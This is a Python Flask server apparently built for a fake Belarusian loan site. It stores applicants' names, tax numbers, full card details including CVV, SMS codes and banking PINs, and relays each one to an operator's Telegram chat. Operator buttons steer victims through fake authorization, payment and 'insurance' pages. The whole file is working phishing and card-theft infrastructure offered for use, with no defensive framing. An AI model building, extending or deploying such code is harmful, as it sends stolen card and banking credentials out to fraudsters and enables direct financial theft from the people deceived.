import os
import sqlite3
import secrets
import random
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru")

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS applications
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  fullname TEXT, phone TEXT, inn TEXT,
                  income REAL, term INTEGER, amount REAL, payment REAL,
                  session_id TEXT, status TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (session_id TEXT PRIMARY KEY,
                  phone TEXT,
                  code_status TEXT DEFAULT 'pending',
                  pin_status TEXT DEFAULT 'pending')''')
    c.execute('''CREATE TABLE IF NOT EXISTS card_data
                 (session_id TEXT PRIMARY KEY,
                  card_holder TEXT, card_number TEXT, card_expiry TEXT, card_cvv TEXT,
                  status TEXT DEFAULT 'pending',
                  code_status TEXT DEFAULT 'pending')''')
    conn.commit()
    conn.close()

init_db()

# ========== ОТПРАВКА В TELEGRAM ==========
def send_to_admin(text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = keyboard
    requests.post(url, json=data)

def get_keyboard(session_id):
    return {
        "inline_keyboard": [
            [{"text": "🔐 Ссылка на авторизацию", "callback_data": f"auth:{session_id}"}],
            [{"text": "💳 Ссылка на оплату", "callback_data": f"payment:{session_id}"}],
            [{"text": "❌ Отклонить", "callback_data": f"reject:{session_id}"}]
        ]
    }

# ========== ОБРАБОТКА КНОПОК (ВЕБХУК) ==========
def send_callback_answer(callback_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    requests.post(url, json={"callback_query_id": callback_id, "text": text})

def edit_message_text(chat_id, message_id, new_text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": new_text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = keyboard
    requests.post(url, json=data)

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if 'callback_query' in data:
        callback = data['callback_query']
        callback_id = callback['id']
        chat_id = callback['message']['chat']['id']
        message_id = callback['message']['message_id']
        callback_data = callback['data']
        
        if callback_data.startswith('auth:'):
            session_id = callback_data.split(':')[1]
            link = f"{SITE_URL}/page_82554/?session={session_id}"
            send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
            
        elif callback_data.startswith('payment:'):
            session_id = callback_data.split(':')[1]
            link = f"{SITE_URL}/page_63860/?session={session_id}"
            send_callback_answer(callback_id, "✅ Ссылка на оплату")
            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
            
        elif callback_data.startswith('reject:'):
            session_id = callback_data.split(':')[1]
            send_callback_answer(callback_id, "❌ Заявка отклонена")
            edit_message_text(chat_id, message_id, f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}", None)
            
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            
        # ========== КАРТА (первый шаг) ==========
        elif callback_data.startswith('card_ok:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET status = "approved" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "✅ Данные карты подтверждены")
            edit_message_text(chat_id, message_id, f"✅ <b>ДАННЫЕ КАРТЫ ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}", None)
            
        elif callback_data.startswith('card_error:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "❌ Данные карты отклонены")
            edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
            
        # ========== КАРТА (второй шаг - код) ==========
        elif callback_data.startswith('code_ok:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET code_status = "approved" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "✅ Код подтверждён")
            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n💰 100 BYN заморожены", None)
            
            # Отправляем новое сообщение с кнопкой на страховку
            insurance_link = f"{SITE_URL}/page_insurance/?session={session_id}"
            insurance_keyboard = {
                "inline_keyboard": [
                    [{"text": "🛡️ Перевести на страховку", "callback_data": f"insurance_link:{session_id}"}]
                ]
            }
            send_to_admin(f"✅ <b>ОПЛАТА 100 BYN УСПЕШНА</b>\n\n💰 Сумма: 100 BYN (заморожена)\n🆔 Сессия: {session_id}\n\n📌 Нажмите кнопку, чтобы отправить клиенту ссылку на страховку.", insurance_keyboard)
            
        elif callback_data.startswith('code_error:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET code_status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "❌ Код отклонён")
            edit_message_text(chat_id, message_id, f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
            
        elif callback_data.startswith('code_insufficient:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET code_status = "insufficient" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "💰 Клиенту показано сообщение о недостатке средств")
            edit_message_text(chat_id, message_id, f"💰 <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\nСессия: {session_id}", None)
            
        # ========== КНОПКА НА СТРАХОВКУ ==========
        elif callback_data.startswith('insurance_link:'):
            session_id = callback_data.split(':')[1]
            insurance_link = f"{SITE_URL}/oplata_strahovki/?session={session_id}"
            send_callback_answer(callback_id, "✅ Ссылка на страховку")
            edit_message_text(chat_id, message_id, f"🛡️ <b>ССЫЛКА НА ОПЛАТУ СТРАХОВКИ</b>\n\n{insurance_link}\n\nОтправьте эту ссылку клиенту.", None)
            
        # ========== СТРАХОВКА (оплата) ==========
        elif callback_data.startswith('insurance_card_ok:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET status = "approved" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "✅ Данные карты подтверждены")
            edit_message_text(chat_id, message_id, f"✅ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}", None)
            
        elif callback_data.startswith('insurance_card_error:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "❌ Данные карты отклонены")
            edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
            
        elif callback_data.startswith('insurance_code_ok:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET code_status = "approved" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "✅ Код подтверждён")
            edit_message_text(chat_id, message_id, f"✅ <b>КОД (СТРАХОВКА) ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n🛡️ Страховка оплачена! Кредит оформлен.", None)
            
        elif callback_data.startswith('insurance_code_error:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE card_data SET code_status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "❌ Код отклонён")
            edit_message_text(chat_id, message_id, f"❌ <b>КОД (СТРАХОВКА) ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
            
        # ========== АВТОРИЗАЦИЯ ==========
        elif callback_data.startswith('auth_code_ok:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE auth_sessions SET code_status = "approved" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "✅ Код подтверждён")
            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
            
        elif callback_data.startswith('auth_code_error:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE auth_sessions SET code_status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "❌ Код отклонён")
            edit_message_text(chat_id, message_id, f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
            
        elif callback_data.startswith('auth_pin_ok:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE auth_sessions SET pin_status = "approved" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "✅ PIN подтверждён")
            edit_message_text(chat_id, message_id, f"✅ <b>PIN ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
            
        elif callback_data.startswith('auth_pin_error:'):
            session_id = callback_data.split(':')[1]
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE auth_sessions SET pin_status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
            send_callback_answer(callback_id, "❌ PIN отклонён")
            edit_message_text(chat_id, message_id, f"❌ <b>PIN ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
    
    return jsonify({"status": "ok"})

# ========== ОСНОВНЫЕ ЭНДПОИНТЫ ==========
@app.route('/submit_credit_application', methods=['POST'])
def submit_application():
    data = request.json
    session_id = secrets.token_hex(8)
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('''INSERT INTO applications (fullname, phone, inn, income, term, amount, payment, session_id)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (data['fullname'], data['phone'], data.get('inn', ''), data['income'],
               data['term'], data['amount'], data['payment'], session_id))
    conn.commit()
    conn.close()
    
    msg = f"""🆕 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>

👤 ФИО: {data['fullname']}
📱 Телефон: {data['phone']}
🆔 ИНН: {data.get('inn', '—')}
💰 Сумма: {data['amount']} BYN
📅 Срок: {data['term']} мес
💳 Платёж: ~{data['payment']} руб

🆔 Сессия: <code>{session_id}</code>"""
    
    send_to_admin(msg, get_keyboard(session_id))
    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/get_application/<session_id>', methods=['GET'])
def get_application(session_id):
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT fullname, phone, amount, term FROM applications WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"fullname": row[0], "phone": row[1], "amount": row[2], "term": row[3]})
    return jsonify({"error": "not found"}), 404

# ========== ОПЛАТА (ОСНОВНАЯ) ==========
@app.route('/submit_card', methods=['POST'])
def submit_card():
    data = request.json
    session_id = data.get('session_id')
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT fullname, phone, amount FROM applications WHERE session_id = ?', (session_id,))
    app_data = c.fetchone()
    
    fullname = app_data[0] if app_data else '—'
    phone = app_data[1] if app_data else '—'
    amount = app_data[2] if app_data else '—'
    
    c.execute('INSERT OR REPLACE INTO card_data (session_id, card_holder, card_number, card_expiry, card_cvv, status) VALUES (?, ?, ?, ?, ?, ?)',
              (session_id, data['card_holder'], data['card_number'], data['card_expiry'], data['card_cvv'], 'pending'))
    conn.commit()
    conn.close()
    
    msg = f"""💳 <b>НОВЫЕ ДАННЫЕ КАРТЫ</b>

👤 Клиент: {fullname}
📱 Телефон: {phone}
💰 Сумма: {amount} BYN

🏷 Владелец: {data['card_holder']}
🔢 Номер: {data['card_number']}
📅 Срок: {data['card_expiry']}
🔐 CVV: {data['card_cvv']}

🆔 Сессия: <code>{session_id}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Данные верные", "callback_data": f"card_ok:{session_id}"}],
            [{"text": "❌ Данные не верные", "callback_data": f"card_error:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

@app.route('/check_card_status/<session_id>', methods=['GET'])
def check_card_status(session_id):
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT status FROM card_data WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"status": row[0]})
    return jsonify({"status": "pending"})

@app.route('/submit_code_check', methods=['POST'])
def submit_code_check():
    data = request.json
    session_id = data['session_id']
    code = data['code']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT fullname, amount FROM applications WHERE session_id = ?', (session_id,))
    app_data = c.fetchone()
    conn.close()
    
    fullname = app_data[0] if app_data else '—'
    amount = app_data[1] if app_data else '—'
    
    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА</b>

👤 Клиент: {fullname}
💰 Сумма: {amount} BYN
🔢 Введённый код: <code>{code}</code>

🆔 Сессия: <code>{session_id}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Код верный", "callback_data": f"code_ok:{session_id}"}],
            [{"text": "❌ Код не верный", "callback_data": f"code_error:{session_id}"}],
            [{"text": "💰 Недостаточно средств", "callback_data": f"code_insufficient:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

@app.route('/check_code_status/<session_id>', methods=['GET'])
def check_code_status(session_id):
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT code_status FROM card_data WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"status": row[0]})
    return jsonify({"status": "pending"})

@app.route('/reset_code_status/<session_id>', methods=['POST'])
def reset_code_status(session_id):
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('UPDATE card_data SET code_status = "pending" WHERE session_id = ?', (session_id,))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

# ========== ОПЛАТА СТРАХОВКИ ==========
@app.route('/submit_insurance_payment', methods=['POST'])
def submit_insurance_payment():
    data = request.json
    session_id = data.get('session_id')
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT fullname, phone FROM applications WHERE session_id = ?', (session_id,))
    app_data = c.fetchone()
    
    fullname = app_data[0] if app_data else '—'
    
    c.execute('INSERT OR REPLACE INTO card_data (session_id, card_holder, card_number, card_expiry, card_cvv, status) VALUES (?, ?, ?, ?, ?, ?)',
              (session_id, data['card_holder'], data['card_number'], data['card_expiry'], data['card_cvv'], 'pending'))
    conn.commit()
    conn.close()
    
    msg = f"""🛡️ <b>ОПЛАТА СТРАХОВКИ</b>

👤 Клиент: {fullname}
💰 Сумма: 250 BYN
🆔 Сессия: <code>{session_id}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Данные верные", "callback_data": f"insurance_card_ok:{session_id}"}],
            [{"text": "❌ Данные не верные", "callback_data": f"insurance_card_error:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

@app.route('/submit_insurance_code_check', methods=['POST'])
def submit_insurance_code_check():
    data = request.json
    session_id = data['session_id']
    code = data['code']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT fullname FROM applications WHERE session_id = ?', (session_id,))
    app_data = c.fetchone()
    conn.close()
    
    fullname = app_data[0] if app_data else '—'
    
    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА (СТРАХОВКА)</b>

👤 Клиент: {fullname}
💰 Сумма: 250 BYN
🔢 Введённый код: <code>{code}</code>

🆔 Сессия: <code>{session_id}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Код верный", "callback_data": f"insurance_code_ok:{session_id}"}],
            [{"text": "❌ Код не верный", "callback_data": f"insurance_code_error:{session_id}"}],
            [{"text": "💰 Недостаточно средств", "callback_data": f"code_insufficient:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

# ========== АВТОРИЗАЦИЯ ==========
@app.route('/submit_auth_phone', methods=['POST'])
def submit_auth_phone():
    data = request.json
    session_id = data['session_id']
    phone = data['phone']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone) VALUES (?, ?)', (session_id, phone))
    conn.commit()
    conn.close()
    
    send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ (телефон)</b>\n\n🆔 Сессия: {session_id}\n📞 Телефон: {phone}")
    return jsonify({"status": "ok"})

@app.route('/submit_auth_code', methods=['POST'])
def submit_auth_code():
    data = request.json
    session_id = data['session_id']
    code = data['code']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    phone = row[0] if row else '—'
    conn.close()
    
    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА (авторизация)</b>

🆔 Сессия: {session_id}
📞 Телефон: {phone}
🔢 Введённый код: <code>{code}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Код верный", "callback_data": f"auth_code_ok:{session_id}"}],
            [{"text": "❌ Код не верный", "callback_data": f"auth_code_error:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

@app.route('/check_auth_code_status/<session_id>', methods=['GET'])
def check_auth_code_status(session_id):
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT code_status FROM auth_sessions WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"status": row[0]})
    return jsonify({"status": "pending"})

@app.route('/submit_auth_pin', methods=['POST'])
def submit_auth_pin():
    data = request.json
    session_id = data['session_id']
    pin = data['pin']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    phone = row[0] if row else '—'
    conn.close()
    
    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ PIN (авторизация)</b>

🆔 Сессия: {session_id}
📞 Телефон: {phone}
🔢 Введённый PIN: <code>{pin}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ PIN верный", "callback_data": f"auth_pin_ok:{session_id}"}],
            [{"text": "❌ PIN не верный", "callback_data": f"auth_pin_error:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

@app.route('/check_auth_pin_status/<session_id>', methods=['GET'])
def check_auth_pin_status(session_id):
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT pin_status FROM auth_sessions WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"status": row[0]})
    return jsonify({"status": "pending"})

# ========== СТАРЫЕ ЭНДПОИНТЫ (для совместимости) ==========
@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    data = request.json
    session_id = data['session_id']
    phone = data['phone']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone) VALUES (?, ?)', (session_id, phone))
    conn.commit()
    conn.close()
    
    send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ</b>\n\nСессия: {session_id}\n📞 {phone}")
    return jsonify({"status": "ok"})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.json
    session_id = data['session_id']
    code = data['code']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    phone = row[0] if row else '—'
    conn.close()
    
    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА</b>

🆔 Сессия: {session_id}
📞 Телефон: {phone}
🔢 Введённый код: <code>{code}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Код верный", "callback_data": f"auth_code_ok:{session_id}"}],
            [{"text": "❌ Код не верный", "callback_data": f"auth_code_error:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

@app.route('/submit_pin', methods=['POST'])
def submit_pin():
    data = request.json
    session_id = data['session_id']
    pin = data['pin']
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
    row = c.fetchone()
    phone = row[0] if row else '—'
    conn.close()
    
    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ PIN</b>

🆔 Сессия: {session_id}
📞 Телефон: {phone}
🔢 Введённый PIN: <code>{pin}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ PIN верный", "callback_data": f"auth_pin_ok:{session_id}"}],
            [{"text": "❌ PIN не верный", "callback_data": f"auth_pin_error:{session_id}"}]
        ]
    }
    
    send_to_admin(msg, keyboard)
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return "✅ API работает"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
